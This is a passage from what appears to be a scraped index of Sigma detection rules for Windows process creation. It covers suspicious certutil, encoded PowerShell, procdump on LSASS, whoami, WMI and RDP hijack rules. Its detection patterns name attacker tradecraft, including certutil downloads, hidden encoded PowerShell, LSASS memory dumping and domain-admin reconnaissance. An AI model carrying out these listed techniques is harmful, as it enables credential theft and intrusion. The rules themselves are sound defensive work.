\u0026#39;decode\u0026#39; sub command, which is sometimes used to decode malicious code with the built-in certutil utility author: Florian Roth, juju4, keepwatch date: 2019/01/16 modified: 2021/04/23 references: - https://twitter.com/JohnLaTwC/status/835149808817991680 - https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/ - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/ - https://twitter.com/egre55/status/1087685529016193025 - https://lolbas-project.github.io/lolbas/Binaries/Certutil/ logsource: category: process_creation product: windows detection: parameters: CommandLine|contains: - \u0026#39; -decode \u0026#39; - \u0026#39; -decodehex \u0026#39; - \u0026#39; -urlcache \u0026#39; - \u0026#39; -verifyctl \u0026#39; - \u0026#39; -encode \u0026#39; - \u0026#39; /decode \u0026#39; - \u0026#39; /decodehex \u0026#39; - \u0026#39; /urlcache \u0026#39; - \u0026#39; /verifyctl \u0026#39; - \u0026#39; /encode \u0026#39; certutil: Image|endswith: \u0026#39;\\certutil.exe\u0026#39; CommandLine|contains: - \u0026#39;URL\u0026#39; - \u0026#39;ping\u0026#39; condition: parameters or certutil fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1140 - attack.command_and_control - attack.t1105 - attack.s0160 - attack.g0007 - attack.g0010 - attack.g0045 - attack.g0049 - attack.g0075 - attack.g0096 falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_certutil_command.yml/","tags":["attack.defense_evasion","attack.t1140","attack.command_and_control","attack.t1105","attack.s0160","attack.g0007","attack.g0010","attack.g0045","attack.g0049","attack.g0075","attack.g0096"],"title":"Suspicious Certutil Command"},{"categories":null,"contents":"Detects suspicious process that use escape characters\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://twitter.com/vysecurity/status/885545634958385153 https://twitter.com/Hexacorn/status/885553465417756673 https://twitter.com/Hexacorn/status/885570278637678592 https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html http://www.windowsinspired.com/understanding-the-command-line-string-and-arguments-received-by-a-windows-program/ Raw rule (edit) title: Suspicious Commandline Escape id: f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd status: test description: Detects suspicious process that use escape characters author: juju4 references: - https://twitter.com/vysecurity/status/885545634958385153 - https://twitter.com/Hexacorn/status/885553465417756673 - https://twitter.com/Hexacorn/status/885570278637678592 - https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html - http://www.windowsinspired.com/understanding-the-command-line-string-and-arguments-received-by-a-windows-program/ date: 2018/12/11 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # - \u0026lt;TAB\u0026gt; # no TAB modifier in sigmac yet, so this matches \u0026lt;TAB\u0026gt; (or TAB in elasticsearch backends without DSL queries) - \u0026#39;h^t^t^p\u0026#39; - \u0026#39;h\u0026#34;t\u0026#34;t\u0026#34;p\u0026#39; condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: low tags: - attack.defense_evasion - attack.t1140 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_cli_escape.yml/","tags":["attack.defense_evasion","attack.t1140"],"title":"Suspicious Commandline Escape"},{"categories":null,"contents":"Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits\nKnown false-positives Unknown References https://twitter.com/rikvduijn/status/853251879320662017 Raw rule (edit) title: Suspicious Control Panel DLL Load id: d7eb979b-c2b5-4a6f-a3a7-c87ce6763819 status: test description: Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits author: Florian Roth references: - https://twitter.com/rikvduijn/status/853251879320662017 date: 2017/04/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\System32\\control.exe\u0026#39; Image|endswith: \u0026#39;\\rundll32.exe \u0026#39; filter: CommandLine|contains: \u0026#39;Shell32.dll\u0026#39; condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_control_dll_load.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Suspicious Control Panel DLL Load"},{"categories":null,"contents":"Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)\nReferences https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e Raw rule (edit) title: Suspicious Encoded PowerShell Command Line id: ca2092a1-c273-4878-9b4b-0d60115bf5ea description: Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet) status: experimental references: - https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e author: Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community date: 2018/09/03 modified: 2021/03/02 tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39; -e\u0026#39; # covers -en and -enc selection2: CommandLine|contains: \u0026#39; JAB\u0026#39; selection3: CommandLine|contains|all: - \u0026#39; -w\u0026#39; - \u0026#39; hidden \u0026#39; selection4: CommandLine|contains: - \u0026#39; BA^J\u0026#39; - \u0026#39; SUVYI\u0026#39; - \u0026#39; SQBFAFgA\u0026#39; - \u0026#39; aQBlAHgA\u0026#39; - \u0026#39; aWV4I\u0026#39; - \u0026#39; IAA\u0026#39; - \u0026#39; IAB\u0026#39; - \u0026#39; UwB\u0026#39; - \u0026#39; cwB\u0026#39; selection5: CommandLine|contains: - \u0026#39;.exe -ENCOD \u0026#39; falsepositive1: CommandLine|contains|all: - \u0026#39; -ExecutionPolicy\u0026#39; - \u0026#39;remotesigned \u0026#39; condition: ((selection and selection2) or (selection and selection2 and selection3) or (selection and selection4) or selection5) and not falsepositive1 level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_enc_cmd.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious Encoded PowerShell Command Line"},{"categories":null,"contents":"Detects suspicious powershell invocations from interpreters or unusual programs\nKnown false-positives Microsoft Operations Manager (MOM) Other scripts References https://www.carbonblack.com/2017/03/15/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/ Raw rule (edit) title: Suspicious PowerShell Invocation Based on Parent Process id: 95eadcb2-92e4-4ed1-9031-92547773a6db status: test description: Detects suspicious powershell invocations from interpreters or unusual programs author: Florian Roth references: - https://www.carbonblack.com/2017/03/15/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/ date: 2019/01/16 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; Image|endswith: \u0026#39;\\powershell.exe\u0026#39; falsepositive: CurrentDirectory|contains: \u0026#39;\\Health Service State\\\u0026#39; condition: selection and not falsepositive fields: - CommandLine - ParentCommandLine falsepositives: - Microsoft Operations Manager (MOM) - Other scripts level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_parent_combo.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Invocation Based on Parent Process"},{"categories":null,"contents":"Detects suspicious PowerShell invocation with a parameter substring\nKnown false-positives Penetration tests References http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier Raw rule (edit) title: Suspicious PowerShell Parameter Substring id: 36210e0d-5b19-485d-a087-c096088885f0 status: test description: Detects suspicious PowerShell invocation with a parameter substring author: Florian Roth (rule), Daniel Bohannon (idea), Roberto Rodriguez (Fix) references: - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier date: 2019/01/16 modified: 2022/02/23 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\Powershell.exe\u0026#39; CommandLine|contains: - \u0026#39; -windowstyle h \u0026#39; - \u0026#39; -windowstyl h\u0026#39; - \u0026#39; -windowsty h\u0026#39; - \u0026#39; -windowst h\u0026#39; - \u0026#39; -windows h\u0026#39; - \u0026#39; -windo h\u0026#39; - \u0026#39; -wind h\u0026#39; - \u0026#39; -win h\u0026#39; - \u0026#39; -wi h\u0026#39; - \u0026#39; -win h \u0026#39; - \u0026#39; -win hi \u0026#39; - \u0026#39; -win hid \u0026#39; - \u0026#39; -win hidd \u0026#39; - \u0026#39; -win hidde \u0026#39; - \u0026#39; -NoPr \u0026#39; - \u0026#39; -NoPro \u0026#39; - \u0026#39; -NoProf \u0026#39; - \u0026#39; -NoProfi \u0026#39; - \u0026#39; -NoProfil \u0026#39; - \u0026#39; -nonin \u0026#39; - \u0026#39; -nonint \u0026#39; - \u0026#39; -noninte \u0026#39; - \u0026#39; -noninter \u0026#39; - \u0026#39; -nonintera \u0026#39; - \u0026#39; -noninterac \u0026#39; - \u0026#39; -noninteract \u0026#39; - \u0026#39; -noninteracti \u0026#39; - \u0026#39; -noninteractiv \u0026#39; - \u0026#39; -ec \u0026#39; - \u0026#39; -encodedComman \u0026#39; - \u0026#39; -encodedComma \u0026#39; - \u0026#39; -encodedComm \u0026#39; - \u0026#39; -encodedCom \u0026#39; - \u0026#39; -encodedCo \u0026#39; - \u0026#39; -encodedC \u0026#39; - \u0026#39; -encoded \u0026#39; - \u0026#39; -encode \u0026#39; - \u0026#39; -encod \u0026#39; - \u0026#39; -enco \u0026#39; - \u0026#39; -en \u0026#39; - \u0026#39; -executionpolic \u0026#39; - \u0026#39; -executionpoli \u0026#39; - \u0026#39; -executionpol \u0026#39; - \u0026#39; -executionpo \u0026#39; - \u0026#39; -executionp \u0026#39; - \u0026#39; -execution bypass\u0026#39; - \u0026#39; -executio bypass\u0026#39; - \u0026#39; -executi bypass\u0026#39; - \u0026#39; -execut bypass\u0026#39; - \u0026#39; -execu bypass\u0026#39; - \u0026#39; -exec bypass\u0026#39; - \u0026#39; -exe bypass\u0026#39; - \u0026#39; -ex bypass\u0026#39; - \u0026#39; -ep bypass\u0026#39; - \u0026#39; /windowstyle h \u0026#39; - \u0026#39; /windowstyl h\u0026#39; - \u0026#39; /windowsty h\u0026#39; - \u0026#39; /windowst h\u0026#39; - \u0026#39; /windows h\u0026#39; - \u0026#39; /windo h\u0026#39; - \u0026#39; /wind h\u0026#39; - \u0026#39; /win h\u0026#39; - \u0026#39; /wi h\u0026#39; - \u0026#39; /win h \u0026#39; - \u0026#39; /win hi \u0026#39; - \u0026#39; /win hid \u0026#39; - \u0026#39; /win hidd \u0026#39; - \u0026#39; /win hidde \u0026#39; - \u0026#39; /NoPr \u0026#39; - \u0026#39; /NoPro \u0026#39; - \u0026#39; /NoProf \u0026#39; - \u0026#39; /NoProfi \u0026#39; - \u0026#39; /NoProfil \u0026#39; - \u0026#39; /nonin \u0026#39; - \u0026#39; /nonint \u0026#39; - \u0026#39; /noninte \u0026#39; - \u0026#39; /noninter \u0026#39; - \u0026#39; /nonintera \u0026#39; - \u0026#39; /noninterac \u0026#39; - \u0026#39; /noninteract \u0026#39; - \u0026#39; /noninteracti \u0026#39; - \u0026#39; /noninteractiv \u0026#39; - \u0026#39; /ec \u0026#39; - \u0026#39; /encodedComman \u0026#39; - \u0026#39; /encodedComma \u0026#39; - \u0026#39; /encodedComm \u0026#39; - \u0026#39; /encodedCom \u0026#39; - \u0026#39; /encodedCo \u0026#39; - \u0026#39; /encodedC \u0026#39; - \u0026#39; /encoded \u0026#39; - \u0026#39; /encode \u0026#39; - \u0026#39; /encod \u0026#39; - \u0026#39; /enco \u0026#39; - \u0026#39; /en \u0026#39; - \u0026#39; /executionpolic \u0026#39; - \u0026#39; /executionpoli \u0026#39; - \u0026#39; /executionpol \u0026#39; - \u0026#39; /executionpo \u0026#39; - \u0026#39; /executionp \u0026#39; - \u0026#39; /execution bypass\u0026#39; - \u0026#39; /executio bypass\u0026#39; - \u0026#39; /executi bypass\u0026#39; - \u0026#39; /execut bypass\u0026#39; - \u0026#39; /execu bypass\u0026#39; - \u0026#39; /exec bypass\u0026#39; - \u0026#39; /exe bypass\u0026#39; - \u0026#39; /ex bypass\u0026#39; - \u0026#39; /ep bypass\u0026#39; condition: selection falsepositives: - Penetration tests level: high tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_suspicious_parameter_variation.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Parameter Substring"},{"categories":null,"contents":"Detects suspicious process related to rasdial.exe\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://twitter.com/subTee/status/891298217907830785 Raw rule (edit) title: Suspicious RASdial Activity id: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e status: test description: Detects suspicious process related to rasdial.exe author: juju4 references: - https://twitter.com/subTee/status/891298217907830785 date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - rasdial.exe condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rasdial_activity.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1059"],"title":"Suspicious RASdial Activity"},{"categories":null,"contents":"Detects a suspicious RDP session redirect using tscon.exe\nKnown false-positives Unknown References http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6 Raw rule (edit) title: Suspicious RDP Redirect Using TSCON id: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb status: test description: Detects a suspicious RDP session redirect using tscon.exe author: Florian Roth references: - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6 date: 2018/03/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39; /dest:rdp-tcp:\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1563.002 - attack.t1021.001 - car.2013-07-002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_tscon_rdp_redirect.yml/","tags":["attack.lateral_movement","attack.t1563.002","attack.t1021.001","car.2013-07-002"],"title":"Suspicious RDP Redirect Using TSCON"},{"categories":null,"contents":"Detects suspicious command line activity on Windows systems\nKnown false-positives Inventory tool runs Penetration tests Administrative activity References https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/ https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/ Raw rule (edit) title: Suspicious Reconnaissance Activity id: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0 status: experimental description: Detects suspicious command line activity on Windows systems author: Florian Roth, omkar72 date: 2019/01/16 modified: 2021/08/09 references: - https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/ - https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/ tags: - attack.discovery - attack.t1087.001 - attack.t1087.002 logsource: category: process_creation product: windows detection: selection: CommandLine: - net group \u0026#34;domain admins\u0026#34; /dom - net localgroup administrators - net group \u0026#34;enterprise admins\u0026#34; /dom - net accounts /dom condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Inventory tool runs - Penetration tests - Administrative activity analysis: recommendation: Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM) level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_recon_activity.yml/","tags":["attack.discovery","attack.t1087.001","attack.t1087.002"],"title":"Suspicious Reconnaissance Activity"},{"categories":null,"contents":"Detects a suspicious svchost process start\nKnown false-positives Unknown Raw rule (edit) title: Suspicious Svchost Process id: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d status: experimental description: Detects a suspicious svchost process start tags: - attack.defense_evasion - attack.t1036.005 author: Florian Roth date: 2017/08/15 modified: 2022/02/09 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\svchost.exe\u0026#39; filter: ParentImage|endswith: - \u0026#39;\\services.exe\u0026#39; - \u0026#39;\\MsMpEng.exe\u0026#39; - \u0026#39;\\Mrt.exe\u0026#39; - \u0026#39;\\rpcnet.exe\u0026#39; - \u0026#39;\\svchost.exe\u0026#39; - \u0026#39;\\ngen.exe\u0026#39; - \u0026#39;\\TiWorker.exe\u0026#39; filter_null1: ParentImage: null filter_null2: ParentImage: \u0026#39;\u0026#39; filter_emptysysmon: ParentImage: \u0026#39;-\u0026#39; condition: selection and not 1 of filter* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_svchost.yml/","tags":["attack.defense_evasion","attack.t1036.005"],"title":"Suspicious Svchost Process"},{"categories":null,"contents":"Detects Access to Domain Group Policies stored in SYSVOL\nKnown false-positives administrative activity References https://adsecurity.org/?p=2288 https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100 Raw rule (edit) title: Suspicious SYSVOL Domain Group Policy Access id: 05f3c945-dcc8-4393-9f3d-af65077a8f86 status: test description: Detects Access to Domain Group Policies stored in SYSVOL author: Markus Neis, Jonhnathan Ribeiro, oscd.community references: - https://adsecurity.org/?p=2288 - https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100 date: 2018/04/09 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;\\SYSVOL\\\u0026#39; - \u0026#39;\\policies\\\u0026#39; condition: selection falsepositives: - administrative activity level: medium tags: - attack.credential_access - attack.t1552.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_sysvol_access.yml/","tags":["attack.credential_access","attack.t1552.006"],"title":"Suspicious SYSVOL Domain Group Policy Access"},{"categories":null,"contents":"Detects a tscon.exe start as LOCAL SYSTEM\nKnown false-positives Unknown References http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6 https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement Raw rule (edit) title: Suspicious TSCON Start as SYSTEM id: 9847f263-4a81-424f-970c-875dab15b79b status: experimental description: Detects a tscon.exe start as LOCAL SYSTEM references: - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6 - https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement author: Florian Roth date: 2018/03/17 modified: 2021/11/29 tags: - attack.command_and_control - attack.t1219 logsource: category: process_creation product: windows detection: selection: User|startswith: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings Image|endswith: \u0026#39;\\tscon.exe\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_tscon_localsystem.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"Suspicious TSCON Start as SYSTEM"},{"categories":null,"contents":"Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter \u0026rsquo; -ma \u0026rsquo; and \u0026rsquo; -accepteula\u0026rsquo; in a single step. This way we\u0026rsquo;re also able to catch cases in which the attacker has renamed the procdump executable.\nKnown false-positives Another tool that uses the command line switches of Procdump Legitimate use of procdump by a developer or administrator References Internal Research Raw rule (edit) title: Suspicious Use of Procdump id: 03795938-1387-481b-9f4c-3f6241e604fe description: Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter \u0026#39; -ma \u0026#39; and \u0026#39; -accepteula\u0026#39; in a single step. This way we\u0026#39;re also able to catch cases in which the attacker has renamed the procdump executable. status: experimental references: - Internal Research author: Florian Roth date: 2021/02/02 modified: 2021/08/16 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39; -ma \u0026#39; - \u0026#39; -accepteula \u0026#39; condition: selection falsepositives: - Another tool that uses the command line switches of Procdump - Legitimate use of procdump by a developer or administrator level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_procdump.yml/","tags":["attack.defense_evasion","attack.t1036","attack.t1003.001"],"title":"Suspicious Use of Procdump"},{"categories":null,"contents":"Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we\u0026rsquo;re also able to catch cases in which the attacker has renamed the procdump executable.\nKnown false-positives Unlikely, because no one should dump an lsass process memory Another tool that uses the command line switches of Procdump References Internal Research Raw rule (edit) title: Suspicious Use of Procdump on LSASS id: 5afee48e-67dd-4e03-a783-f74259dcf998 description: Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we\u0026#39;re also able to catch cases in which the attacker has renamed the procdump executable. status: stable references: - Internal Research author: Florian Roth date: 2018/10/30 modified: 2021/02/02 tags: - attack.defense_evasion - attack.t1036 - attack.credential_access - attack.t1003.001 - car.2013-05-009 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: \u0026#39; -ma \u0026#39; selection2: CommandLine|contains: \u0026#39; lsass\u0026#39; selection3: CommandLine|contains|all: - \u0026#39; -ma \u0026#39; - \u0026#39; ls\u0026#39; condition: ( selection1 and selection2 ) or selection3 falsepositives: - Unlikely, because no one should dump an lsass process memory - Another tool that uses the command line switches of Procdump level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_procdump_lsass.yml/","tags":["attack.defense_evasion","attack.t1036","attack.credential_access","attack.t1003.001","car.2013-05-009"],"title":"Suspicious Use of Procdump on LSASS"},{"categories":null,"contents":"Detects WMI executing suspicious commands\nKnown false-positives If using Splunk, we recommend | stats count by Computer,CommandLine following for easy hunting by Computer/CommandLine References https://digital-forensics.sans.org/blog/2010/06/04/wmic-draft/ https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1 https://blog.malwarebytes.com/threat-analysis/2016/04/rokku-ransomware/ Raw rule (edit) title: Suspicious WMI Execution id: 526be59f-a573-4eea-b5f7-f0973207634d status: test description: Detects WMI executing suspicious commands author: Michael Haag, Florian Roth, juju4, oscd.community references: - https://digital-forensics.sans.org/blog/2010/06/04/wmic-draft/ - https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1 - https://blog.malwarebytes.com/threat-analysis/2016/04/rokku-ransomware/ date: 2019/01/16 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\wmic.exe\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;process\u0026#39; - \u0026#39;call\u0026#39; - \u0026#39;create \u0026#39; recon_part1: CommandLine|contains: \u0026#39; path \u0026#39; recon_part2: CommandLine|contains: - \u0026#39;AntiVirus\u0026#39; - \u0026#39;Firewall\u0026#39; CommandLine|contains|all: - \u0026#39;Product\u0026#39; - \u0026#39; get \u0026#39; condition: (selection and selection2) or (selection and recon_part1 and recon_part2) fields: - CommandLine - ParentCommandLine falsepositives: - If using Splunk, we recommend | stats count by Computer,CommandLine following for easy hunting by Computer/CommandLine level: medium tags: - attack.execution - attack.t1047 - car.2016-03-002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_wmi_execution.yml/","tags":["attack.execution","attack.t1047","car.2016-03-002"],"title":"Suspicious WMI Execution"},{"categories":null,"contents":"Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec)\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b Raw rule (edit) title: Sysprep on AppData Folder id: d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e status: test description: Detects suspicious sysprep process start with AppData folder as target (as used by Trojan Syndicasec in Thrip report by Symantec) author: Florian Roth references: - https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets - https://app.any.run/tasks/61a296bb-81ad-4fee-955f-3b399f4aaf4b date: 2018/06/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\sysprep.exe\u0026#39; CommandLine|contains: - \u0026#39;\\AppData\\\u0026#39; condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_sysprep_appdata.yml/","tags":["attack.execution","attack.t1059"],"title":"Sysprep on AppData Folder"},{"categories":null,"contents":"Detects the creation of a process from Windows task manager\nKnown false-positives Administrative activity Raw rule (edit) title: Taskmgr as Parent id: 3d7679bd-0c00-440c-97b0-3f204273e6c7 status: test description: Detects the creation of a process from Windows task manager author: Florian Roth date: 2018/03/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\taskmgr.exe\u0026#39; filter: Image|endswith: - \u0026#39;\\resmon.exe\u0026#39; - \u0026#39;\\mmc.exe\u0026#39; - \u0026#39;\\taskmgr.exe\u0026#39; condition: selection and not filter fields: - Image - CommandLine - ParentCommandLine falsepositives: - Administrative activity level: low tags: - attack.defense_evasion - attack.t1036 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_taskmgr_parent.yml/","tags":["attack.defense_evasion","attack.t1036"],"title":"Taskmgr as Parent"},{"categories":null,"contents":"Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators\nKnown false-positives Admin activity Scripts and administrative tools used in the monitored environment Monitoring activity References https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/ https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/ Raw rule (edit) title: Whoami Execution id: e28a5a99-da44-436d-b7a0-2afc20a5f413 status: test description: Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators author: Florian Roth references: - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/ - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/ date: 2018/08/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\whoami.exe\u0026#39; condition: selection falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment - Monitoring activity level: medium tags: - attack.discovery - attack.t1033 - car.2016-03-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_whoami.yml/","tags":["attack.discovery","attack.t1033","car.2016-03-001"],"title":"Whoami Execution"},{"categories":null,"contents":"Detects the execution of whoami with suspicious parents or parameters\nKnown false-positives Admin activity Scripts and administrative tools used in the monitored environment Monitoring activity References https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/ https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/ Raw rule (edit) title: Whoami Execution Anomaly id: 8de1cbe8-d6f5-496d-8237-5f44a721c7a0 status: experimental description: Detects the execution of whoami with suspicious parents or parameters references: - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/ - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/ author: Florian Roth date: 2021/08/12 modified: 2021/08/26 tags: - attack.discovery - attack.t1033 - car.2016-03-001 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\whoami.exe\u0026#39; filter1: ParentImage|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; filter2: ParentImage: - \u0026#39;C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe\u0026#39; - \u0026#39;\u0026#39; filter3: ParentImage: null selection_special: CommandLine|contains: - \u0026#39;whoami -all\u0026#39; - \u0026#39;whoami /all\u0026#39; - \u0026#39;whoami.exe -all\u0026#39; - \u0026#39;whoami.exe /all\u0026#39; condition: ( selection and not filter1 and not filter2 and not filter3 ) or selection_special falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment - Monitoring activity level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_whoami_anomaly.yml/","tags":["attack.discovery","attack.t1033","car.2016-03-001"],"title":"Whoami Execution Anomaly"},{"categories":null,"contents":"Detects a suspicious child process of a Windows shell\nKnown false-positives Administrative scripts Microsoft SCCM References https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html Raw rule (edit) title: Windows Shell Spawning 